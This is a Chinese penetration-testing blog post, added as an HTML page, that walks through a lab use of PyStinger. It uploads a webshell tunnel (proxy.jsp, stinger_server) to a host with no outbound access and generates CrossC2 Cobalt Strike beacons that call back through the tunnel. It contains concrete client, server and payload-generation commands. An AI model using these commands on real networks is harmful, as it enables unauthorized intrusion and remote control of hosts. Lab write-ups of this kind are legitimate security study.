@@ -1,0 +1,303 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PyStinger毒刺不出网上线CS | c0ys</title>
+<link rel="shortcut icon" href="https://c0ys.cn/favicon.ico?v=1656907333431">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://c0ys.cn/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="PyStinger毒刺不出网上线CS | c0ys - Atom Feed" href="https://c0ys.cn/atom.xml">
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<meta name="robots" content="nofollow">
+<meta name="googlebot" content="noindex, nofollow">
+<meta name="baiduspider" content="noindex, nofollow">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+
+<script>
+  fetch('https://v1.hitokoto.cn')
+    .then(response => response.json())
+    .then(data => {
+      const hitokoto = document.getElementById('hitokoto_text')
+      hitokoto.href = 'https://hitokoto.cn/?uuid=' + data.uuid
+      hitokoto.innerText = data.hitokoto
+    })
+    .catch(console.error)
+</script>
+
+<script>
+  var _hmt = _hmt || [];
+  (function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?93f5a2255c8226ec27177b0c251feb9f";
+    var s = document.getElementsByTagName("script")[0]; 
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+  
+    <meta name="description" content="官方说明
+https://github.com/FunnyWolf/pystinger/blob/master/readme_cn.md
+操作说明
+
+
+proxy.jsp上传到目标服务器,确保 http://example.com:8080..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://c0ys.cn">
+  <img class="avatar" src="https://c0ys.cn/images/avatar.png?v=1656907333431" alt="">
+  </a>
+  <h1 class="site-title">
+    c0ys
+  </h1>
+  <p class="site-description" id="hitokoto">
+    <a id="hitokoto_text"> 吾心吾行澄如明镜，所作所为皆为正义。</a>
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="https://c0ys.cn/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://c0ys.cn/post/talk" class="menu">
+          留言
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              PyStinger毒刺不出网上线CS
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-04-21
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://bu.dusays.com/2022/04/21/fbb740c07738e.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h2 id="官方说明">官方说明</h2>
+<p><a href="https://github.com/FunnyWolf/pystinger/blob/master/readme_cn.md">https://github.com/FunnyWolf/pystinger/blob/master/readme_cn.md</a></p>
+<h2 id="操作说明">操作说明</h2>
+<ul>
+<li>
+<p>proxy.jsp上传到目标服务器,确保 <a href="http://example.com:8080/proxy.jsp">http://example.com:8080/proxy.jsp</a> 可以访问,页面返回 <code>UTF-8</code></p>
+</li>
+<li>
+<p>将stinger_server.exe上传到目标服务器,蚁剑/冰蝎执行<code>start D:/XXX/stinger_server.exe</code>启动服务端</p>
+<blockquote>
+<p>不要直接运行<code>D:/XXX/stinger_server.exe</code>,会导致tcp断连</p>
+</blockquote>
+</li>
+<li>
+<p>vps执行<code>./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000</code></p>
+</li>
+<li>
+<p>此时已经在vps<code>127.0.0.1:60000</code>启动了一个<code>example.com</code>所在内网的<strong>socks4a</strong>代理</p>
+</li>
+<li>
+<p>此时已经将目标服务器的<code>127.0.0.1:60020</code>映射到vps的<code>127.0.0.1:60020</code></p>
+</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://bu.dusays.com/2022/04/21/dbc66ad1958e9.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://bu.dusays.com/2022/04/21/f9382a6594e28.png" alt="" loading="lazy"></figure>
+<h2 id="坑点">坑点</h2>
+<ul>
+<li><code>tomcat-8.5 </code>不行，隧道的webshell无法返回utf-8</li>
+<li><code>tomcat-7.0.32</code>可行。</li>
+</ul>
+<h2 id="配合crossc2">配合CrossC2</h2>
+<p>经常遇到不出网的linux主机作为入口点，上次bank项目就是。这里就想模拟试一下，完成CS上线。其实这种情况</p>
+<ul>
+<li>msf/viper或许更巴适。</li>
+<li>或者proxy之类软件，中转一下流量上线或许更好。</li>
+</ul>
+<p>C2主机：<code>10.211.55.7</code>  Kali Linux</p>
+<p>入口点：<code>10.211.55.16</code> Ubuntu</p>
+<p>内网其他主机：<code>10.211.55.11</code> Windows 10</p>
+<h3 id="不出网linux入口点上线cs">不出网linux入口点上线CS</h3>
+<ul>
+<li>正常连接webshell，上传隧道文件以及stinger_server并执行。（用的tomcat7.0+jdk7）<br>
+<img src="https://bu.dusays.com/2022/04/21/8f86950ccf01d.png" alt="" loading="lazy"></li>
+<li>C2主机上执行<br>
+<code>./stinger_client -w http://10.211.55.16:8080/proxy.jsp -l 127.0.0.1 -p 60000</code><br>
+效果就是<code>127.0.0.1:60000</code>启动了一个<code>10.211.55.16</code>所在内网的<strong>socks4a</strong>代理<br>
+且vps上的60020，对应着内网60020。至此隧道建立完毕</li>
+<li>cs生成linux上线木马<br>
+<code>./genCrossC2.MacOS 127.0.0.1 60020 beacon_keys null Linux x64 cc2.out</code><br>
+<img src="https://bu.dusays.com/2022/04/21/3aa442825a077.png" alt="" loading="lazy"></li>
+</ul>
+<h3 id="内网其他主机上线">内网其他主机上线</h3>
+<ul>
+<li>唯一需要注意的是前面启stinger服务端的时候要加ip<br>
+<code>./stinger_server 0.0.0.0</code></li>
+<li>cobalt strike添加监听,端口选择RAT Config中的Handler/LISTEN中的端口(通常为60020),beacons为<code>10.211.55.16</code>(example.com的内网IP地址)</li>
+</ul>
+<blockquote>
+<p>其实我的理解就是把上述的127.0.0.1 该成对应的内网ip，达成内网其他主机可以通讯的作用。</p>
+</blockquote>
+<p><strong>上线内网其他Linux主机：</strong></p>
+<pre><code class="language-纯文本">./genCrossC2.MacOS 10.211.55.16 60020 beacon_keys null Linux x64 16.out
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://bu.dusays.com/2022/04/21/fbb740c07738e.png" alt="" loading="lazy"></figure>
+<p><strong>上线内网其他Windows主机：</strong></p>
+<p>由于CrossC2中必须用https监听，所以win7啥的上不了线。</p>
+<figure data-type="image" tabindex="4"><img src="https://bu.dusays.com/2022/04/21/0a902ae58a1bf.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://bu.dusays.com/2022/04/21/85366656a44af.png" alt="" loading="lazy"></figure>
+<h3 id="弊端">弊端</h3>
+<p>说说弊端</p>
+<ul>
+<li>pystinger在tomcat高版本不行，限制1</li>
+<li>配合CrossC2的https监听，win7等低版本windows不能上线，限制2</li>
+</ul>
+<p>总体而言，这不是最优解吧，只能说一次尝试，对隧道的理解加深仅此而已吧。</p>
+
+                <blockquote>
+                  <p>声明：本博客文章所分享内容仅用于技术交流，禁止用于违法途径，所有渗透都需获取授权！否则需自行承担，本站及原作者不承担相应的后果。</p>
+                </blockquote>
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E5%AE%98%E6%96%B9%E8%AF%B4%E6%98%8E">官方说明</a></li>
+<li><a href="#%E6%93%8D%E4%BD%9C%E8%AF%B4%E6%98%8E">操作说明</a></li>
+<li><a href="#%E5%9D%91%E7%82%B9">坑点</a></li>
+<li><a href="#%E9%85%8D%E5%90%88crossc2">配合CrossC2</a>
+<ul>
+<li><a href="#%E4%B8%8D%E5%87%BA%E7%BD%91linux%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8A%E7%BA%BFcs">不出网linux入口点上线CS</a></li>
+<li><a href="#%E5%86%85%E7%BD%91%E5%85%B6%E4%BB%96%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF">内网其他主机上线</a></li>
+<li><a href="#%E5%BC%8A%E7%AB%AF">弊端</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://c0ys.cn/post/ZkgInCZIX/">
+              <h3 class="post-title">
+                CrossC2踩坑
+              </h3>
+            </a>
+          </div>
+        
+      
+        
+            <script src="https://cdn.jsdelivr.net/npm/twikoo@1.5.0/dist/twikoo.all.min.js"></script>
+
+<div id="tcomment"></div>
+<script>
+twikoo.init({
+  envId: 'https://talk.c0ys.cn',
+  el: '#tcomment'
+})
+</script> 
+          
+
+        
+
+        <div class="site-footer">
+  Powered by<a href="https://github.com/c0ys" target="_blank">c0ys</a>
+  <a class="rss" href="https://c0ys.cn/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
